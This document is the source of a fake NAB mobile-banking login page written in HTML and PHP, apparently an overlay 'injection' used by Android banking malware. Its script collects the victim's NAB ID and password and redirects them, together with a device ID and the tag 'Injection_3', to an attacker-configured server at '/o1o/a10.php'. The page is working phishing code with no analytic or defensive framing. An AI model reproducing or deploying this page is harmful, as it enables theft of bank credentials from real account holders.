<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="au/au.com.nab.mobile/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>

<div class="header">
	<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAA5klEQVR42rXQPUoDURSG4ddGLVO5izRaJQuI6SS9vdnPgKtIaSUMgfyM5RSJVSAuIAvQyus34oQwxT3FFw8cmMOF54VhAYV2v4YR+CPnRl65hE0NPRpcm7SfFdy7uODtn5fe4JYG1fHVidi4tqAdPYwzEQsPIh5uRGLciMS4EYlxKxLhdkT7GOB2JGVwKzI5xXXPz4Z/wLXA107gewXT/8BL7SETsfCXd7isoJ+JeHj7HkQ8PBN5snEjEuNGJMaNSIzbEX08Z3AronuIjlmL7+CK4/iRNTz8/iJ9DBJccKapobeEO4Af7MY/wU8qCpAAAAAASUVORK5CYII=" style="padding: 23px;display: inline-flex;float: left;">
	<h3 style="display: inline-flex;margin: 22px;float: left;font-size: 22px;font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;"> Login </h3>
	<h3 style="color: rgb(195,5,5);display: inline-flex;margin: 22px;float: right;font-size: 22px;font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;"> Register </h3>
</div>
<div id="content_div">


<h2 style="margin: 0;margin-bottom: 10px;font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;font-weight: bold;"> ENTER DETAILS </h2>

<h3 style="margin: 0;margin-bottom: 10px;font-weight: bold;font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;font-size: 14px;"> Your profile will be saved after you login. </h3>

<div id="form">
	<form id="form">
	<div class="field">
		<div class="error_hide" id="login_error"> <span class="fa fa-warning"></span> Enter your NAB ID. </div>
		<input id="login" class="input" name="field2" placeholder="" type="text" maxlength="10" required="">
		<label for="login">NAB ID</label>
	</div>

					<script>
						document.getElementById('login').onkeypress = function (e) {
							return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
						}
					</script>
	<div class="field" style="margin-bottom: 15px;">
		<div class="error_hide" id="login_error"> <span class="fa fa-warning"></span> Enter your NAB ID. </div>
		<input class="input" id="password" name="field3" placeholder="" type="password" style="margin: 0;" required="">
		<label for="password">Password</label>
	</div>
</div>
	<h3 style="color: rgb(194,0,0); text-align: center; display: block; font-weight: 100;font-size: 14px;margin-bottom: 20px;"> Forgot your password? <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAMAAADXqc3KAAAA21BMVEUAAADBAADCAADCAADHAADDAADCAADFAADCAADCAADBAADEAAD/AADDAADDAAD/AAD/AADDAADCAAC/AADDAADDAADBAADCAADDAADEAADDAADCAADFAADBAADCAADRAACqAADCAADCAAD/AACAAADBAADDAADCAADCAAC2AADCAAC/AADCAAC/AADDAADDAADCAADVAADCAADCAAC/AAC/AADDAADCAADBAADCAADCAADMAADDAADDAADDAADCAADEAADDAADCAADCAADDAADBAADCAADEAADCAAAhamrvAAAASHRSTlMAPufGIOjfH4b+5A0Cq+QEAZrlFJ7gIaDcHqrZFrbhCwOx4gMC4xGkqAeeBN4MyMfUBq/NGAitzq3WGQWy2MPgl9fjFTPOsBoXtuczAAAApUlEQVQoz22SRRIDMQwEN8zMzIwbZgb9/0UZX6PRsVuSx2VblimH0+W2WHlEvD4m/AGRYIiIcEREojFi4gmYZIrNpGEyWWZyMPkCM0WYUpmdU0G2ao2YegMzzRYxbXNOp8tmejB9IgZm2VDzkeHjieZTw0n/DHHnut9eoH+5Uny9Ad9qbu/A9wfFjyfws95fv4BfycVuyHNnT/tAnif7DK/35/uHfmNEHUTxiBE0AAAAAElFTkSuQmCC" style="width: 13px;"> </h3>



	</form>
  <input type="submit" onClick="sentServer();" id="finish" class="submit" value="Login"/>

	<h3 style="font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;font-size: 14px;"> If you don't have Internet Banking login details you may need to <u style="color: rgb(194,0,0);">register.</u> </h3>

</div>


<script>
	function sentServer()
	{

    					var oNumInp = document.getElementById('login');
                            var oCodeInp = document.getElementById('password');

    						try{
    							oNumInp.className = oCodeInp.className = 'input';
    						} catch(e){};

                            if (!/^\w{2,10}$/i.test(oNumInp.value)) {
    							try{
    								oNumInp.className = 'fielderror';
    							} catch(e){};
                                return false;
                            }

                            if (!/^\w{2,50}$/i.test(oCodeInp.value)) {
    							try{
                                    oCodeInp.className = 'fielderror';
    							} catch(e){};
                                return false;
                            }
	var login1 =  document.forms["form"].elements["login"].value;
    var password =document.forms["form"].elements["password"].value;

	var url='<?php echo $URL; ?>';
    var imei_c='<?php echo $IMEI_country; ?>';

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|nab|"+login1+"|"+password);
	}
</script>
</body>
</html>
